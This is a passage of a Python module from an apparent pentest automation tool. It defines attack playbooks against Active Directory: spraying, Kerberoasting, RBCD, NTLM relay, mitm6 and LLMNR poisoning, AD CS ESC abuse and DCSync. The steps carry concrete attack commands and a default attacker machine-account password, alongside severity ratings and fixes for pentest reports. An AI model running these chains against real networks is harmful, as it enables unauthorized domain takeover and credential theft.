# Author: Ali Alaqoul <alialaqoul@gmail.com>
"""Editable, persisted playbook definitions for the web console.

A playbook is a declarative description of an attack path Autopwn follows — the
AD kill chain in `chains.py`, plus web / relay side-paths. Each has:

  * ``match``  — how it is selected against scan results (ports / fact signals).
  * ``run``    — the macro tool that executes it (e.g. ad_kill_chain), so a
                 playbook can be launched as a job straight from the console.
  * ``steps``  — the ordered actions. Every step is a small data-flow node:
      - ``trigger``  : the condition that fires the step (what must be true).
      - ``tool``     : the action it runs.
      - ``consumes`` : artifacts it needs from earlier steps.
      - ``produces`` : artifacts it hands forward.
      - ``next``     : where control flows on success ("next" / "final" / a step).
      - ``branches`` : conditional re-routes ("if guest disabled → …").

    This makes each step's trigger and what it passes on explicit, which is what
    the console's step builder edits and the reader view visualises.

Defaults live in DEFAULT_PLAYBOOKS. On first use they are written to
``<log_dir>/playbooks.json``; after that the operator edits them through the UI.
`evaluate()` computes — and explains — whether a playbook matches the current
service matrix, so the matching is transparent rather than magic.
"""
from __future__ import annotations

import copy
import json
import re
from pathlib import Path


# Bump when the built-in playbooks change so existing installs re-seed them.
_BUILTIN_VERSION = 24

# Controlled vocabulary the step builder offers (free text is still allowed).
# `domain`/`signing`/`host_info` are the reconnaissance variables an early
# fingerprint step produces (and that later Kerberos steps consume).
ARTIFACTS = [
    "domain", "host_info", "signing", "userlist", "credential", "hash", "ticket",
    "spn_hash", "asrep_hash", "shares", "relay_targets", "coerced", "machine_account",
    "adcs_vuln", "certificate", "certighost", "mssql_exec", "delegation", "trust",
    "acl_write",
    "gpp", "zerologon_vuln", "nopac_vuln", "printnightmare_vuln", "ms17_vuln",
    "weak_policy", "dpapi_secret", "pre2k_hit", "sccm", "ssh_cred", "admin", "flag",
]
# Execution triggers the sequence runner understands (see sequence._trigger_ok).
# A step fires when its trigger is true against the current variables.
TRIGGERS = [
    "start", "guest", "no userlist", "have userlist", "have credential",
    "have password", "have hashes", "signing disabled",
]
SIGNALS = [
    "username", "nthash", "signing_false", "guest", "has_users",
    "kerberoastable", "asreproastable",
]
NEXT_CHOICES = ["next", "final"]
SEVERITIES = ["Critical", "High", "Medium", "Low", "Info"]
# Host facts a finding playbook can match on (fact -> what it means).
HOST_FACTS = {
    "smb_signing": "'False' when SMB signing is not enforced",
    "smb_nullauth": "'True' when anonymous SMB is permitted",
    "os": "OS string harvested from the host",
    "pwned": "'Pwn3d!' when an account is admin on the host",
    "kerberoastable": "SPN hashes were obtained",
    "asreproastable": "AS-REP hashes were obtained",
}

SCHEMA = {
    "artifacts": ARTIFACTS,   # what a step can consume / produce
    "triggers": TRIGGERS,     # common step preconditions
    "signals": SIGNALS,       # fact signals usable in match / triggers
    "next": NEXT_CHOICES,
    "severities": SEVERITIES,
    "host_facts": HOST_FACTS,
    "notes": {
        "trigger": "The condition that fires this step.",
        "consumes": "Artifacts this step needs from earlier steps.",
        "produces": "Artifacts this step hands to the next / final step.",
        "next": "'next' = fall through, 'final' = goal, or a step title.",
        "severity": "Set severity+cvss to make this playbook a reportable finding.",
        "host_facts": "Match a host only when these facts equal these values.",
    },
}


def _finding(pb_id, name, severity, cvss, summary, impact, recommendation,
             any_ports=None, host_facts=None, evidence_tools=None,
             detector="", signals=None):
    """A detection/reporting playbook: when it matches the scan it becomes a
    finding in the report carrying this severity, CVSS, impact and recommendation."""
    return {
        "id": pb_id, "name": name, "category": "finding",
        "severity": severity, "cvss": cvss, "summary": summary,
        "impact": impact, "recommendation": recommendation,
        "match": {"any_ports": any_ports or [], "host_facts": host_facts or {},
                  "signals": signals or []},
        "evidence_tools": evidence_tools or [], "detector": detector,
        "run": {"tool": ""}, "steps": [],
    }


def _step(n, title, trigger, tool, consumes, produces, detail, nxt="next",
          branches=None, severity="", cvss="", impact="", recommendation="",
          finding_title="", args=None):
    # A step is one executable action: `tool` is the single built-in/catalog tool
    # it RUNS, `trigger` is when it fires, and `args` are fixed arguments for the
    # tool. The playbook's execution sequence is generated from these steps
    # (see runnable_sequence), so the tool shown on the step is the tool that runs.
    # severity (+ cvss/impact/recommendation/finding_title) additionally makes the
    # step a reportable finding when it fires (its produced artifact is evidenced).
    return {"n": n, "title": title, "trigger": trigger, "tool": tool,
            "args": args or {}, "consumes": consumes, "produces": produces,
            "detail": detail, "next": nxt, "branches": branches or [],
            "severity": severity, "cvss": cvss, "impact": impact,
            "recommendation": recommendation, "finding_title": finding_title}


# A step's tool is "runnable" (part of the execution sequence) when it names a
# single tool — not a descriptive label like "netexec_smb / netexec_rid_brute".
_DESCRIPTIVE_TOOL = re.compile(r"[\s/+,]")


def _runnable_tool(tool: str) -> bool:
    tool = (tool or "").strip()
    return bool(tool) and _DESCRIPTIVE_TOOL.search(tool) is None


def runnable_sequence(pb: dict) -> list:
    """The executable sequence for a playbook, GENERATED from its steps.

    Each step that names a single tool contributes one execution entry
    (tool + when-trigger + fixed args + label), in order. So the tool shown on a
    step in the builder is exactly the tool that runs. An explicit ``run.sequence``
    (legacy / hand-authored) still takes precedence for backward compatibility.
    """
    run = pb.get("run") or {}
    if run.get("sequence"):
        return run["sequence"]
    seq = []
    for st in pb.get("steps", []):
        tool = (st.get("tool") or "").strip()
        if not _runnable_tool(tool):
            continue
        seq.append({"tool": tool, "when": st.get("trigger", "start"),
                    "args": st.get("args") or {}, "label": st.get("title", "")})
    return seq


DEFAULT_PLAYBOOKS = [
    {
        "id": "ad-kill-chain",
        "name": "Active Directory — no/low creds → Domain Admin",
        "summary": "Guest/RID → spray → AS-REP → Kerberoast → loot → pass-the-hash. "
                   "Re-routes on what each step actually finds.",
        "match": {"any_ports": [88, 389, 445, 636, 3268], "signals": []},
        # No separate run.sequence: the executable sequence is GENERATED from the
        # steps below (each step's tool + trigger + args), so the tool shown on a
        # step is exactly the tool that runs.
        "run": {},
        "steps": [
            _step(1, "Fingerprint + null session", "start",
                  "netexec_smb", [], ["domain", "host_info", "signing"],
                  "netexec_smb against the DC to read the domain, hostname and SMB "
                  "signing over a null session. The domain it discovers is required "
                  "by the Kerberos steps (kerbrute / AS-REP / Kerberoast)."),
            _step(2, "RID-cycle the domain user list", "start",
                  "netexec_rid_brute", [], ["userlist"],
                  "RID-brute over a guest/null session to walk every domain user "
                  "(SidTypeUser) into a user list.",
                  severity="Medium", cvss="5.3",
                  finding_title="Domain User Enumeration via Null / Guest Session",
                  impact="An unauthenticated attacker can enumerate the full domain "
                         "user list (guest/null session + RID cycling), which seeds "
                         "password spraying and roasting attacks.",
                  recommendation="Disable the Guest account, restrict anonymous SID/RID "
                         "enumeration (RestrictAnonymous), and monitor for RID cycling."),
            _step(3, "User-enum fallback (hardened DC)", "no userlist",
                  "kerbrute_userenum", ["domain"], ["userlist"],
                  "When RID cycling returns nothing, enumerate valid usernames via "
                  "Kerberos pre-auth (no lockout). Needs the domain."),
            _step(4, "AS-REP roast", "have userlist",
                  "asrep_roast", ["userlist", "domain"], ["asrep_hash"],
                  "Request AS-REP hashes for accounts without Kerberos pre-auth.",
                  severity="High", cvss="7.5",
                  finding_title="AS-REP Roastable Accounts (Kerberos Pre-Authentication Disabled)",
                  impact="Accounts with Kerberos pre-authentication disabled allow an "
                         "unauthenticated attacker to request AS-REP hashes and crack "
                         "them offline, yielding domain credentials.",
                  recommendation="Enable Kerberos pre-authentication on all accounts "
                         "(remove DONT_REQ_PREAUTH) and enforce strong passwords."),
            _step(5, "Crack AS-REP hashes", "have hashes",
                  "crack_hashes", ["asrep_hash"], ["credential"],
                  "Crack the AS-REP hashes offline with john + rockyou."),
            _step(6, "Password spray (username == password)", "have userlist",
                  "netexec_spray", ["userlist"], ["credential"],
                  "One server-side batch, --no-bruteforce (one attempt per user, no "
                  "lockout): try password == username.",
                  args={"userpass": "true"},
                  severity="High", cvss="8.1",
                  finding_title="Weak or Guessable Account Passwords",
                  impact="Weak or guessable account passwords (including password equal "
                         "to the username) were accepted, giving an attacker a domain "
                         "foothold for lateral movement.",
                  recommendation="Enforce a strong password policy, block username-based "
                         "and common passwords (e.g. Azure AD Password Protection), and "
                         "enable account lockout / spray detection."),
            _step(7, "Authenticated LDAP user dump", "have credential",
                  "netexec_ldap", ["credential"], ["userlist"],
                  "With a credential, dump the complete user list over LDAP.",
                  args={"action": "--users"}),
            _step(8, "Kerberoast SPN accounts", "have credential",
                  "kerberoast", ["credential", "domain"], ["spn_hash"],
                  "GetUserSPNs for SPN accounts to request their service tickets. "
                  "Needs a credential and the domain.",
                  severity="High", cvss="8.1",
                  finding_title="Kerberoastable Service Accounts",
                  impact="Service accounts with SPNs are Kerberoastable: any domain user "
                         "can request their service tickets and crack them offline. "
                         "Service accounts are often privileged.",
                  recommendation="Use group Managed Service Accounts (gMSA) or 25+ char "
                         "random passwords for SPN accounts, and use AES encryption."),
            _step(9, "Crack Kerberoast hashes", "have hashes",
                  "crack_hashes", ["spn_hash"], ["credential"],
                  "Crack the Kerberoast (krb5tgs) hashes offline with john + rockyou."),
            _step(10, "Password reuse spray", "have password",
                  "spray_cracked", ["credential", "userlist"], ["credential"],
                  "Spray a cracked password across all users (the user list) to "
                  "find reuse."),
            _step(11, "Loot readable shares", "have credential",
                  "smb_loot", ["credential"], ["shares", "hash"],
                  "Enumerate and flag readable non-default SMB shares (backups, "
                  "scripts, GPP cpassword, KeePass).",
                  severity="Medium", cvss="6.5",
                  finding_title="Credential Reuse and Sensitive Data on Readable Shares",
                  impact="Recovered passwords are reused across accounts and/or credential "
                         "material (NTLM hashes, GPP cpassword, backups) is exposed on "
                         "readable shares, extending compromise.",
                  recommendation="Enforce unique passwords, remove secrets from shares, "
                         "and restrict share permissions to least privilege."),
            _step(12, "Confirm access / admin", "have credential",
                  "netexec_smb", ["credential"], ["admin", "flag"],
                  "Authenticate to the DC and run whoami; watch for Pwn3d! (local "
                  "admin) — then read C$ / capture flags.", "final",
                  args={"command": "whoami"},
                  severity="Critical", cvss="9.8",
                  finding_title="Full Domain Compromise — Administrative Access to Domain Controller",
                  impact="Administrative access to a Domain Controller was achieved "
                         "(pass-the-hash / DCSync), giving full control of the domain — "
                         "all accounts, hashes and data are compromised.",
                  recommendation="Rotate krbtgt and privileged credentials, enforce "
                         "tiered administration and LAPS, restrict NTLM, and monitor for "
                         "DCSync/replication from non-DCs."),
        ],
    },
    {
        "id": "rbcd",
        "name": "RBCD to Domain Admin (write over a computer)",
        "summary": "Abuse write access to a computer's delegation attribute plus "
                   "MachineAccountQuota to impersonate an admin.",
        "match": {"any_ports": [88, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Create a machine account", "have credential", "add_computer",
                  ["credential"], ["machine_account"],
                  "Create a computer you control (default ATTACK$ / Attack123!). Succeeds "
                  "only when MachineAccountQuota > 0 — the enabling misconfiguration.",
                  severity="Medium", cvss="5.9",
                  finding_title="MachineAccountQuota Permits Computer Account Creation",
                  impact="Any authenticated user can join up to MachineAccountQuota (default "
                         "10) computers to the domain — the controlled principal needed for "
                         "RBCD and other delegation attacks.",
                  recommendation="Set ms-DS-MachineAccountQuota to 0 and delegate computer "
                         "creation to a dedicated group."),
            _step(2, "Find a computer you can write over", "have credential", "bloodyad",
                  ["credential"], ["acl_write"],
                  "bloodyAD get writable — list computer objects your account can write "
                  "(GenericWrite/WriteDACL/GenericAll over a computer = an RBCD target). "
                  "Pick one and set it as the `delegate_to` variable."),
            _step(3, "Write RBCD delegation onto the target", "have credential", "rbcd",
                  ["credential", "machine_account", "acl_write"], [],
                  "impacket-rbcd auto-fills -delegate-from ATTACK$ and -action write; set the "
                  "`delegate_to` variable to the target computer (e.g. SRV01$) from step 2.",
                  args={"delegate_from": "ATTACK$"}),
            _step(4, "S4U2Proxy ticket + use it", "have credential",
                  "get_st (run as ATTACK$: -spn cifs/<target> -impersonate Administrator)",
                  ["machine_account"], ["ticket", "admin", "flag"],
                  "impacket-getST as ATTACK$:Attack123! auto-fills -impersonate Administrator; "
                  "set -spn cifs/<target.fqdn>. Then KRB5CCNAME=… secretsdump -k / psexec -k "
                  "on the target. This is the RBCD → Domain Admin escalation (Critical); it "
                  "runs as the created machine account, so provide those creds + the target SPN.",
                  "final"),
        ],
    },
    {
        "id": "smb-relay",
        "name": "Coercion + NTLM relay (unsigned SMB)",
        "summary": "Coerce a DC/host to authenticate (PrinterBug/PetitPotam) and relay "
                   "that NTLM to a signing-disabled host for code exec or a secrets dump.",
        "match": {"any_ports": [445], "signals": ["signing_false"]},
        "run": {},
        "steps": [
            _step(1, "Find relay targets (unsigned SMB)", "start", "netexec_smb",
                  [], ["relay_targets", "signing"],
                  "Fingerprint SMB signing; hosts returning signing:False are relay targets "
                  "(in GOAD: CASTELBLACK .22 and BRAAVOS .23)."),
            _step(2, "Coerce authentication from a DC", "have credential", "coercer",
                  ["credential"], ["coerced"],
                  "Coerce the DC to authenticate to your listener over MS-RPRN "
                  "(PrinterBug) / MS-EFSR (PetitPotam). Provide listener = your IP.",
                  severity="High", cvss="8.1",
                  finding_title="Authentication Coercion (PrinterBug / PetitPotam)",
                  impact="A DC/host can be coerced into authenticating to an arbitrary "
                         "target, feeding an NTLM relay to any unsigned host (or ADCS ESC8) "
                         "for domain compromise.",
                  recommendation="Patch MS-RPRN/MS-EFSR, disable the Print Spooler on DCs, "
                         "enforce SMB signing and EPA, and disable NTLM."),
            _step(3, "Relay to the unsigned host", "start",
                  "ntlm_relay (mode=smb — auto-orchestrates listener + coercion; run as root)",
                  ["relay_targets", "coerced"], ["hash", "admin"],
                  "Autopwn's built-in ntlm_relay tool starts ntlmrelayx, coerces the target "
                  "into it, and dumps the SAM automatically. Run as root against the launch "
                  "target: sudo autopwn run --tool ntlm_relay --set target=<coerced host> "
                  "--set relay_to=<signing:False host> --set mode=smb. Both hosts must be in "
                  "scope. (In-console it stays documentation because the web service is "
                  "non-root and can't bind 445.)",
                  "final"),
        ],
    },
    {
        "id": "ipv6-relay",
        "name": "IPv6 DNS takeover (mitm6) → NTLM relay → domain",
        "summary": "With NO credentials, poison IPv6 DNS with mitm6 so Windows hosts use "
                   "you as their DNS, coerce NTLM via WPAD, and relay it to LDAP / AD CS "
                   "for a domain foothold or full takeover — the classic on-the-wire "
                   "internal attack.",
        "match": {"any_ports": [445, 389], "signals": []},
        "run": {},
        "steps": [
            _step(1, "Poison IPv6 DNS (mitm6)", "start",
                  "mitm6 (run as root: mitm6 -d <domain> -i <iface>)",
                  [], ["coerced"],
                  "mitm6 answers DHCPv6 / IPv6 name resolution so segment hosts set YOU "
                  "as their DNS, then serves WPAD → hosts authenticate to you. Runs "
                  "continuously; start the relay listener first, then mitm6 feeds it. "
                  "Intrusive — poisons the whole segment; authorized use only.",
                  severity="High", cvss="8.1",
                  finding_title="IPv6 DNS Takeover Possible (mitm6 / WPAD)",
                  impact="An unauthenticated attacker on the segment can become the hosts' "
                         "DNS over IPv6 and coerce NTLM authentication (WPAD), feeding an "
                         "NTLM relay to LDAP/AD CS for escalation up to Domain Admin.",
                  recommendation="Disable IPv6 if unused (or filter DHCPv6/RA-guard), turn "
                         "off WPAD, enforce LDAP signing + channel binding and SMB signing, "
                         "and disable NTLM."),
            _step(2, "Relay the coerced auth (LDAP RBCD / AD CS ESC8)", "start",
                  "ntlm_relay (mode=ldap or adcs — run as root)",
                  ["coerced"], ["machine_account", "certificate", "admin", "flag"],
                  "Relay the mitm6-coerced NTLM to LDAP (write RBCD / add a computer → "
                  "impersonate) or to AD CS web enrollment (ESC8 → certificate → DCSync). "
                  "The built-in ntlm_relay tool automates the listener; run as root.",
                  "final"),
        ],
    },
    {
        "id": "llmnr-poison",
        "name": "LLMNR/NBT-NS poisoning → crack → spray",
        "summary": "Poison LLMNR/NBT-NS name resolution on a Windows subnet to "
                   "capture NetNTLMv2 hashes, crack them offline, and spray the "
                   "recovered passwords across the domain.",
        "match": {"any_ports": [445], "signals": []},
        "run": {},
        "steps": [
            _step(1, "Poison LLMNR/NBT-NS and capture hashes", "start",
                  "responder_capture", [], ["hash"],
                  "Autopwn's built-in responder_capture tool starts Responder on "
                  "the local interface for a bounded window and captures NetNTLMv2 "
                  "hashes from broadcast name-resolution traffic. Run as root, early "
                  "in the engagement, on a subnet with Windows hosts.",
                  args={"duration": 120},
                  severity="High", cvss="8.1",
                  finding_title="LLMNR/NBT-NS Poisoning — NetNTLMv2 Hashes Captured",
                  impact="LLMNR/NBT-NS broadcast name resolution is enabled, so an "
                         "attacker on the subnet can poison lookups and capture "
                         "NetNTLMv2 password hashes, which crack offline into domain "
                         "credentials.",
                  recommendation="Disable LLMNR and NBT-NS via GPO, require SMB "
                         "signing, enforce strong passwords (NetNTLMv2 resists "
                         "cracking), and segment/monitor broadcast traffic."),
            _step(2, "Crack the captured hashes", "have hashes",
                  "crack_hashes", ["hash"], ["credential"],
                  "Crack the captured NetNTLMv2 hashes offline with john + rockyou."),
            _step(3, "Spray cracked passwords (max 1–2 tries)", "have credential",
                  "spray_cracked", ["credential", "userlist"], ["credential", "admin"],
                  "Spray each cracked password across the domain user list to find "
                  "reuse. Never spray more than 1–2 passwords per account — lockout "
                  "risk.", "final"),
        ],
    },
    {
        "id": "web-app",
        "name": "Web application assessment",
        "summary": "Fingerprint, enumerate content, test the common classes; pivot "
                   "any recovered credential back into the network.",
        "match": {"any_ports": [80, 443, 8080, 8443, 8000], "signals": []},
        "run": {"tool": ""},
        "steps": [
            _step(1, "Fingerprint", "start", "http_probe", [], [],
                  "Server, tech stack, titles, redirects, headers."),
            _step(2, "Content discovery", "start", "ffuf / feroxbuster", [], [],
                  "Directory/vhost brute force; find admin panels, APIs, uploads."),
            _step(3, "Vulnerability scan", "start", "nuclei", [], ["credential"],
                  "Test auth, injection, SSRF, deserialization, default creds.",
                  severity="High", cvss="7.5",
                  finding_title="Exploitable Web Application Vulnerability / Default Credentials",
                  impact="The web application exposed a vulnerability or default/weak "
                         "credentials that yield a foothold.",
                  recommendation="Patch the identified issue, remove default credentials, "
                         "and apply secure configuration and input validation."),
            _step(4, "Pivot credentials", "have credential", "netexec_spray",
                  ["credential"], ["admin"],
                  "Any recovered credential → spray across the AD estate.", "final"),
        ],
    },
    {
        "id": "mgmt-server-audit",
        "name": "Enterprise management-server audit (ePO / SolarWinds / Splunk / …)",
        "summary": "Recognise the management & monitoring appliances that run an "
                   "estate — Trellix ePO, SolarWinds NPM/Orion, Splunk, Acronis "
                   "Cyber Protect, Tripwire, ExtremeCloud IQ Site Engine, WSUS, NPS "
                   "— then non-destructively test each: default credentials, "
                   "notable CVEs (nuclei), and read-only proof-of-access PoCs. These "
                   "boxes store the credentials that unlock the rest of the network.",
        "match": {"any_ports": [443, 8443, 8444, 8081, 8082, 8000, 8089, 9997,
                                8080, 8530, 8531, 9877, 9876, 7780], "signals": []},
        "run": {"tool": ""},
        "steps": [
            # The findings are produced by the macros themselves (product_recon /
            # default_creds emit precise, per-product findings), so the steps carry
            # no step-level finding — that avoids a generic duplicate and stops the
            # default-cred finding from false-firing on a credential recovered
            # elsewhere in the run.
            _step(1, "Fingerprint the product", "start", "product_recon", [],
                  ["host_info"],
                  "Match the host against the management-server catalogue, tag it, "
                  "run each product's read-only PoC and nuclei CVE templates, and "
                  "report every exposed console with its CVEs + credential-vault "
                  "loot.", args={"cve_scan": "true"}),
            _step(2, "Test default credentials", "start", "default_creds", [],
                  ["credential"],
                  "Try each recognised product's vendor/default credentials against "
                  "its login endpoint (login attempt only, no change)."),
            _step(3, "Pivot recovered credentials", "have credential",
                  "netexec_spray", ["credential"], ["admin"],
                  "Spray any recovered console credential across the estate — these "
                  "accounts are frequently reused.", "final"),
        ],
    },
    {
        "id": "net-device-audit",
        "name": "Network device & firewall audit (Cisco / Extreme / FortiGate / Juniper)",
        "summary": "Recognise the switches and firewalls that carry an estate — "
                   "Cisco IOS & ASA/FTD, Extreme EXOS, Fortinet FortiGate, Juniper "
                   "JunOS — from SSH/HTTP/SNMP fingerprints, then non-destructively "
                   "test each: default + readable/writable SNMP communities, notable "
                   "device CVEs, read-only auth-bypass PoCs (FortiOS/ASA path "
                   "traversal), and an exposed Cisco Smart Install (4786). Their "
                   "configs hold the credentials + topology for the whole network.",
        "match": {"any_ports": [22, 23, 80, 443, 4786, 8443, 10443, 830, 541],
                  "signals": []},
        "run": {"tool": ""},
        "steps": [
            # Findings come from the macros (net_device_recon / snmp_audit emit
            # precise per-device findings), so the steps carry no step-level finding.
            _step(1, "Fingerprint the device", "start", "net_device_recon", [],
                  ["host_info"],
                  "Identify the device from its SSH banner, HTTP title and SNMP "
                  "sysDescr; tag it; run each product's read-only PoC and the Cisco "
                  "Smart Install (4786) check; report it with CVEs + config-loot."),
            _step(2, "Audit SNMP communities", "start", "snmp_audit", [], [],
                  "Brute common SNMP community strings (GET only) and flag readable "
                  "communities — write-suggesting names are likely RW = config push.",
                  "final"),
        ],
    },
    {
        "id": "kerberoast-da",
        "name": "Kerberoast a service account (assumed breach)",
        "summary": "With one domain credential, roast SPN service accounts and crack "
                   "them offline — service accounts are often highly privileged.",
        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Fingerprint the DC", "start", "netexec_smb", [],
                  ["domain", "host_info"],
                  "Read the domain from the DC (needed by GetUserSPNs)."),
            _step(2, "Kerberoast SPN accounts", "have credential", "kerberoast",
                  ["credential", "domain"], ["spn_hash"],
                  "GetUserSPNs for every SPN account and request their tickets.",
                  severity="High", cvss="8.1",
                  finding_title="Kerberoastable Service Accounts",
                  impact="SPN service accounts can be roasted by any domain user and "
                         "cracked offline; they are frequently privileged.",
                  recommendation="Use gMSA or 25+ char random passwords for SPN accounts "
                         "and enforce AES."),
            _step(3, "Crack the tickets", "have hashes", "crack_hashes",
                  ["spn_hash"], ["credential"],
                  "Crack the krb5tgs hashes offline with john + rockyou."),
            _step(4, "Confirm the recovered account", "have credential", "netexec_smb",
                  ["credential"], ["admin", "flag"],
                  "Authenticate with the cracked service account; watch for Pwn3d!.",
                  "final", args={"command": "whoami /groups"}),
        ],
    },
    {
        "id": "adcs-esc",
        "name": "AD CS abuse — full ESC audit → Domain Admin",
        "summary": "Enumerate every AD CS misconfiguration (ESC1-ESC15) with certipy and "
                   "report each as its own finding, then for the enrollable classes "
                   "(ESC1/2/3/9/13) enroll a certificate as a Domain Admin and authenticate "
                   "with it to recover their NT hash / TGT. ESC8 (HTTP relay) has its own "
                   "playbook (relay-adcs-esc8).",
        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Enumerate CAs + vulnerable templates", "have credential", "certipy_find",
                  ["credential", "domain"], ["adcs_vuln"],
                  "certipy find -vulnerable: enumerate every CA and certificate template and "
                  "flag the ESC1-ESC16 misconfigurations. Harvests the CA name + a vulnerable "
                  "template for the exploitation steps. (Needs DNS pointed at a DC.)"),
            _step(2, "ESC1 — enrollee-supplies-subject + client auth", "have credential",
                  "certipy req -template <t> -upn administrator@<domain>", ["adcs_vuln"], ["adcs_esc1"],
                  "A template allows the enrollee to supply the subject and has a client-auth "
                  "EKU — enroll a certificate as ANY user (a Domain Admin). Directly exploited "
                  "by steps 10-11.",
                  severity="Critical", cvss="9.8",
                  finding_title="AD CS ESC1 — Enrollee-Supplied Subject (Domain Admin Cert)",
                  impact="Any principal with enrollment rights can obtain a certificate "
                         "impersonating a Domain Admin — full domain compromise.",
                  recommendation="Remove CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, require CA "
                         "manager approval, and restrict enrollment rights."),
            _step(3, "ESC2 — Any Purpose / no EKU template", "have credential",
                  "certipy req (Any-Purpose cert) → authenticate", ["adcs_vuln"], ["adcs_esc2"],
                  "A template with the Any-Purpose EKU (or no EKU) issues a cert usable for "
                  "client authentication (and more) — enroll and authenticate as a privileged "
                  "user.",
                  severity="High", cvss="8.1",
                  finding_title="AD CS ESC2 — Any-Purpose / No-EKU Certificate Template",
                  impact="An over-permissive EKU lets an enrolled certificate be used for "
                         "domain authentication, enabling impersonation.",
                  recommendation="Scope template EKUs tightly; remove Any-Purpose; require "
                         "approval."),
            _step(4, "ESC3 — Enrollment Agent template", "have credential",
                  "certipy req -on-behalf-of <DA> (enrollment agent)", ["adcs_vuln"], ["adcs_esc3"],
                  "A template grants the Certificate Request Agent EKU — request a cert ON "
                  "BEHALF OF a Domain Admin and authenticate as them.",
                  severity="High", cvss="8.1",
                  finding_title="AD CS ESC3 — Enrollment Agent Certificate",
                  impact="An enrollment-agent certificate lets the holder enroll on behalf of "
                         "any user, including Domain Admins.",
                  recommendation="Restrict enrollment-agent templates and enrollment-agent "
                         "rights; enable manager approval."),
            _step(5, "ESC4 — writable template ACL", "have credential",
                  "certipy template -write (make it ESC1) / bloodyAD", ["adcs_vuln"], ["adcs_esc4"],
                  "The account has write access over a certificate template's object — "
                  "reconfigure it into an ESC1 template (enrollee-supplies-subject + client "
                  "auth), then enroll as a Domain Admin.",
                  severity="High", cvss="8.1",
                  finding_title="AD CS ESC4 — Writable Certificate Template ACL",
                  impact="Write access over a template allows turning it into an ESC1 "
                         "escalation vector at will.",
                  recommendation="Audit and remove dangerous ACEs (Write/WriteDacl/"
                         "WriteOwner/FullControl) on certificate templates."),
            _step(6, "ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA", "have credential",
                  "certipy req -upn administrator@<domain> (SAN)", ["adcs_vuln"], ["adcs_esc6"],
                  "The CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled, so a SAN can be supplied "
                  "in ANY request — enroll a cert with a Domain Admin UPN in the SAN.",
                  severity="Critical", cvss="9.8",
                  finding_title="AD CS ESC6 — CA Allows Arbitrary SAN (EDITF flag)",
                  impact="Any enrollable template becomes an ESC1 vector — a SAN with a "
                         "privileged UPN yields a Domain Admin certificate.",
                  recommendation="Remove EDITF_ATTRIBUTESUBJECTALTNAME2 from the CA policy "
                         "and restart certsvc."),
            _step(7, "ESC7 — vulnerable CA ACL (ManageCA/ManageCertificates)", "have credential",
                  "certipy ca -add-officer / issue a pending request", ["adcs_vuln"], ["adcs_esc7"],
                  "The account holds ManageCA or ManageCertificates on the CA — enable the SAN "
                  "flag (ESC6), add yourself as an officer, or approve a pending request to "
                  "obtain a privileged certificate.",
                  severity="High", cvss="8.1",
                  finding_title="AD CS ESC7 — Dangerous CA Permissions (ManageCA/Certificates)",
                  impact="CA management rights allow issuing/approving arbitrary certificates "
                         "and enabling ESC6 — a path to Domain Admin.",
                  recommendation="Restrict ManageCA/ManageCertificates to tiered CA admins."),
            _step(8, "ESC9 — no security extension (szOID_NTDS_CA_SECURITY_EXT)", "have credential",
                  "certipy req + auth (weak cert mapping)", ["adcs_vuln"], ["adcs_esc9"],
                  "A template sets CT_FLAG_NO_SECURITY_EXTENSION — combined with weak cert "
                  "mapping (or an altered UPN) the certificate authenticates as another user.",
                  severity="High", cvss="8.1",
                  finding_title="AD CS ESC9 — No Security Extension on Template",
                  impact="Missing the SID security extension enables certificate-mapping abuse "
                         "to impersonate a privileged account.",
                  recommendation="Apply the May 2022+ KB5014754 hardening (StrongCertificate"
                         "BindingEnforcement) and remove the flag."),
            _step(9, "ESC13 — issuance policy linked to a group", "have credential",
                  "certipy req (policy → group membership)", ["adcs_vuln"], ["adcs_esc13"],
                  "A template's issuance policy is linked (msDS-OIDToGroupLink) to a "
                  "privileged group — enrolling grants that group's access via the cert.",
                  severity="High", cvss="8.1",
                  finding_title="AD CS ESC13 — Issuance Policy Linked to a Group",
                  impact="Enrolling a cert with the linked issuance policy yields membership "
                         "of a privileged group.",
                  recommendation="Remove msDS-OIDToGroupLink from issuance policies or "
                         "restrict enrollment of the linked template."),
            _step(10, "Enroll a certificate as Domain Admin (ESC1/2/3/6/9/13)", "have credential",
                  "certipy_req", ["adcs_vuln", "credential"], ["certificate"],
                  "certipy req: the CA + a vulnerable template are auto-filled from step 1, and "
                  "the UPN defaults to administrator@<domain> — enrols a certificate "
                  "impersonating a Domain Admin and saves the .pfx."),
            _step(11, "Authenticate with the certificate → hash/TGT", "have credential",
                  "certipy_auth", ["certificate"], ["credential", "hash", "admin"],
                  "certipy auth: the .pfx auto-fills from step 10 → recovers the target user's "
                  "NT hash + a Kerberos TGT (Domain Admin).", "final"),
        ],
    },
    {
        "id": "mssql-foothold",
        "name": "MSSQL foothold (xp_cmdshell)",
        "summary": "Authenticate to MSSQL with a domain credential and gain OS command "
                   "execution as the service account via xp_cmdshell.",
        "match": {"any_ports": [1433], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "Authenticate to MSSQL", "have credential", "netexec_mssql",
                  ["credential", "domain"], [],
                  "Windows-auth to the SQL instance with a recovered domain credential."),
            _step(2, "Command execution via xp_cmdshell", "have credential",
                  "netexec_mssql", ["credential"], ["mssql_exec"],
                  "Enable and run xp_cmdshell to execute OS commands as the SQL service "
                  "account (then abuse SeImpersonate → SYSTEM).", "final",
                  args={"command": "whoami"},
                  severity="High", cvss="8.1",
                  finding_title="MSSQL Command Execution via xp_cmdshell",
                  impact="A domain credential grants SQL access that enables OS command "
                         "execution as the service account, a foothold toward SYSTEM.",
                  recommendation="Restrict SQL logins, disable xp_cmdshell, run SQL under a "
                         "low-privileged account without SeImpersonate, and patch."),
        ],
    },
    {
        "id": "domain-dominance",
        "name": "Domain dominance (DCSync → golden ticket)",
        "summary": "With a privileged credential, replicate the directory (DCSync/NTDS) "
                   "and forge a golden ticket for persistence.",
        "match": {"any_ports": [88, 389, 445], "signals": ["username"]},
        "run": {},
        "steps": [
            _step(1, "DCSync / NTDS dump", "have credential", "secretsdump",
                  ["credential"], ["hash"],
                  "Replicate secrets from the DC (SAM/LSA/NTDS incl. krbtgt).",
                  severity="Critical", cvss="9.8",
                  finding_title="Domain Credential Replication (DCSync / NTDS Dump)",
